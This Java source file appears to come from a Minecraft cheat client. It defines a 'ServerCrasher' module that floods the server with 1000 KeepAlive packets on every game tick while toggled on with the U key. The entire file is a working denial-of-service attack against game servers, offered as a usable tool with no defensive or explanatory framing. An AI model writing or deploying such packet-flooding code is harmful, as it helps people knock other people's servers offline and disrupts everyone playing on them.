package caterpillow.Module.Misc;

import org.lwjgl.input.Keyboard;

import caterpillow.Module.Category;
import caterpillow.Module.Module;
import caterpillow.event.EventTarget;
import caterpillow.event.events.EventUpdate;
import net.minecraft.network.play.client.C00PacketKeepAlive;

public class ServerCrasher extends Module {
	public ServerCrasher() {
		super("Server Crasher", Keyboard.KEY_U, Category.MISC);
	}

	@EventTarget
	public void onUpdate(EventUpdate event) {
		for (int i = 0; i < 1000; i++) {
			mc.thePlayer.sendQueue.addToSendQueue(new C00PacketKeepAlive((int) System.nanoTime()));
		}
	}

}
